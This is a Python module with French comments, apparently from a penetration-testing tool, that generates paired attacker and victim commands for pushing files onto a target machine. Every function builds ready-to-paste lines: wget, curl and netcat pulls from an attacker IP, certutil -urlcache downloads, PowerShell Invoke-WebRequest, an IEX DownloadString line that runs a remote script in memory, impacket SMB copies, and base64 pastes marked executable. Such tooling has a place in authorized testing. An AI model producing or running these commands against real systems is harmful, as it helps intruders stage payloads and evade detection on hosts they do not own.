"""Transfer Helper — commandes attaquant + victime pour transfert de fichiers.

Cas couverts :
- Linux cible   : wget / curl / scp / nc
- Windows cible : certutil / iwr (PowerShell) / SMB `copy` / impacket-smbserver
- Base64        : en dernier recours (paste dans le terminal cible)

L'utilisateur renseigne attacker_ip, port HTTP/SMB, fichier, dossier
victime. On retourne les 2 lignes prêtes à copier.
"""

from __future__ import annotations

import base64
import os
from dataclasses import dataclass, field
from pathlib import Path
from typing import List, Optional


@dataclass
class TransferPair:
    label: str
    description: str
    attacker_command: str
    victim_command: str
    os_victim: str            # "linux" / "windows"
    method: str               # http / smb / base64 / nc


def _fname(p: str | Path) -> str:
    return Path(p).name


# --------------------------------------------------------------
# Linux cible
# --------------------------------------------------------------

def linux_http_wget(file_path: str, attacker_ip: str, port: int = 8000, dest_dir: str = "/tmp") -> TransferPair:
    fn = _fname(file_path)
    return TransferPair(
        label="Linux | HTTP | wget",
        description="Lancer un HTTP server côté attaquant puis wget côté cible.",
        attacker_command=f"cd $(dirname {file_path}) && python3 -m http.server {port}",
        victim_command=f"wget http://{attacker_ip}:{port}/{fn} -O {dest_dir}/{fn}",
        os_victim="linux",
        method="http",
    )


def linux_http_curl(file_path: str, attacker_ip: str, port: int = 8000, dest_dir: str = "/tmp") -> TransferPair:
    fn = _fname(file_path)
    return TransferPair(
        label="Linux | HTTP | curl",
        description="HTTP + curl -o (fallback si wget absent).",
        attacker_command=f"cd $(dirname {file_path}) && python3 -m http.server {port}",
        victim_command=f"curl http://{attacker_ip}:{port}/{fn} -o {dest_dir}/{fn}",
        os_victim="linux",
        method="http",
    )


def linux_scp(file_path: str, attacker_ip: str, victim_user: str = "user", dest_dir: str = "/tmp") -> TransferPair:
    fn = _fname(file_path)
    return TransferPair(
        label="Linux | SCP",
        description="Depuis la cible, pull par scp vers attaquant (ssh server attaquant requis).",
        attacker_command="# rien - assurez-vous que sshd tourne chez vous",
        victim_command=f"scp {victim_user}@{attacker_ip}:{file_path} {dest_dir}/{fn}",
        os_victim="linux",
        method="scp",
    )


def linux_nc_push(file_path: str, attacker_ip: str, port: int = 9000, dest_dir: str = "/tmp") -> TransferPair:
    fn = _fname(file_path)
    return TransferPair(
        label="Linux | NetCat push",
        description="Envoi du fichier via netcat.",
        attacker_command=f"nc -lvnp {port} < {file_path}",
        victim_command=f"nc {attacker_ip} {port} > {dest_dir}/{fn}",
        os_victim="linux",
        method="nc",
    )


def linux_base64_paste(file_path: str, dest_dir: str = "/tmp") -> TransferPair:
    fn = _fname(file_path)
    path = Path(file_path)
    # Le base64 d'un fichier de N bytes prend ~1.33 N en memoire RAM,
    # plus N pour la lecture, donc ~2.4 N. Bloquer au dessus de 2 MB
    # (sinon UI gele 1-2s + commande paste illisible).
    MAX_BYTES = 2 * 1024 * 1024
    if not path.exists():
        b64 = "<PAS_DE_FICHIER>"
    else:
        try:
            size = path.stat().st_size
            if size > MAX_BYTES:
                b64 = f"<FICHIER_TROP_GROS_{size}_octets_max_{MAX_BYTES}>"
            else:
                b64 = base64.b64encode(path.read_bytes()).decode("ascii")
        except OSError:
            b64 = "<LECTURE_ECHOUEE>"
    return TransferPair(
        label="Linux | Base64 paste",
        description="Paste direct dans le shell cible (fichier petit !).",
        attacker_command=f"base64 -w0 {file_path}",
        victim_command=f"echo '{b64}' | base64 -d > {dest_dir}/{fn} && chmod +x {dest_dir}/{fn}",
        os_victim="linux",
        method="base64",
    )


# --------------------------------------------------------------
# Windows cible
# --------------------------------------------------------------

def windows_certutil(file_path: str, attacker_ip: str, port: int = 8000, dest_dir: str = "C:\\Windows\\Temp") -> TransferPair:
    fn = _fname(file_path)
    return TransferPair(
        label="Windows | certutil",
        description="certutil -urlcache (même sur Win7+, sans PowerShell).",
        attacker_command=f"cd $(dirname {file_path}) && python3 -m http.server {port}",
        victim_command=(
            f"certutil -urlcache -split -f http://{attacker_ip}:{port}/{fn} "
            f"{dest_dir}\\{fn}"
        ),
        os_victim="windows",
        method="http",
    )


def windows_iwr(file_path: str, attacker_ip: str, port: int = 8000, dest_dir: str = "C:\\Windows\\Temp") -> TransferPair:
    fn = _fname(file_path)
    return TransferPair(
        label="Windows | Invoke-WebRequest (PS)",
        description="PowerShell 3+.",
        attacker_command=f"cd $(dirname {file_path}) && python3 -m http.server {port}",
        victim_command=(
            f"powershell -c \"iwr http://{attacker_ip}:{port}/{fn} "
            f"-OutFile {dest_dir}\\{fn}\""
        ),
        os_victim="windows",
        method="http",
    )


def windows_iex(file_path: str, attacker_ip: str, port: int = 8000) -> TransferPair:
    """Pour scripts .ps1 qu'on exécute en mémoire, sans écriture disque."""
    fn = _fname(file_path)
    return TransferPair(
        label="Windows | IEX in-memory",
        description="Exécute un .ps1 en mémoire sans toucher au disque.",
        attacker_command=f"cd $(dirname {file_path}) && python3 -m http.server {port}",
        victim_command=(
            f"powershell -c \"iex (New-Object Net.WebClient).DownloadString("
            f"'http://{attacker_ip}:{port}/{fn}')\""
        ),
        os_victim="windows",
        method="http",
    )


def windows_smb_copy(file_path: str, attacker_ip: str, share: str = "ATTACK", dest_dir: str = "C:\\Windows\\Temp") -> TransferPair:
    fn = _fname(file_path)
    return TransferPair(
        label="Windows | SMB copy",
        description="impacket-smbserver côté attaquant, `copy` côté cible.",
        attacker_command=(
            f"impacket-smbserver {share} $(dirname {file_path}) -smb2support"
        ),
        victim_command=f"copy \\\\{attacker_ip}\\{share}\\{fn} {dest_dir}\\{fn}",
        os_victim="windows",
        method="smb",
    )


def windows_base64_paste(file_path: str, dest_dir: str = "C:\\Windows\\Temp") -> TransferPair:
    fn = _fname(file_path)
    path = Path(file_path)
    MAX_BYTES = 2 * 1024 * 1024
    if not path.exists():
        b64 = "<PAS_DE_FICHIER>"
    else:
        try:
            size = path.stat().st_size
            if size > MAX_BYTES:
                b64 = f"<FICHIER_TROP_GROS_{size}_octets_max_{MAX_BYTES}>"
            else:
                b64 = base64.b64encode(path.read_bytes()).decode("ascii")
        except OSError:
            b64 = "<LECTURE_ECHOUEE>"
    return TransferPair(
        label="Windows | Base64 paste (PS)",
        description="Paste direct dans une PS. Fichiers petits (~1-2 MB max).",
        attacker_command=f"base64 -w0 {file_path}",
        victim_command=(
            f"powershell -c \"[IO.File]::WriteAllBytes('{dest_dir}\\{fn}', "
            f"[Convert]::FromBase64String('{b64}'))\""
        ),
        os_victim="windows",
        method="base64",
    )


# --------------------------------------------------------------
# API
# --------------------------------------------------------------

def all_for_linux(file_path: str, attacker_ip: str, port_http: int = 8000, port_nc: int = 9000, dest_dir: str = "/tmp") -> List[TransferPair]:
    return [
        linux_http_wget(file_path, attacker_ip, port_http, dest_dir),
        linux_http_curl(file_path, attacker_ip, port_http, dest_dir),
        linux_nc_push(file_path, attacker_ip, port_nc, dest_dir),
        linux_scp(file_path, attacker_ip, dest_dir=dest_dir),
        linux_base64_paste(file_path, dest_dir),
    ]


def all_for_windows(file_path: str, attacker_ip: str, port_http: int = 8000, share: str = "ATTACK", dest_dir: str = "C:\\Windows\\Temp") -> List[TransferPair]:
    return [
        windows_certutil(file_path, attacker_ip, port_http, dest_dir),
        windows_iwr(file_path, attacker_ip, port_http, dest_dir),
        windows_iex(file_path, attacker_ip, port_http),
        windows_smb_copy(file_path, attacker_ip, share, dest_dir),
        windows_base64_paste(file_path, dest_dir),
    ]


def generate(file_path: str, attacker_ip: str, os_target: str = "linux", **kwargs) -> List[TransferPair]:
    """Point d'entrée unique pour le dialog Transfer Helper."""
    if os_target == "windows":
        return all_for_windows(file_path, attacker_ip, **kwargs)
    return all_for_linux(file_path, attacker_ip, **kwargs)
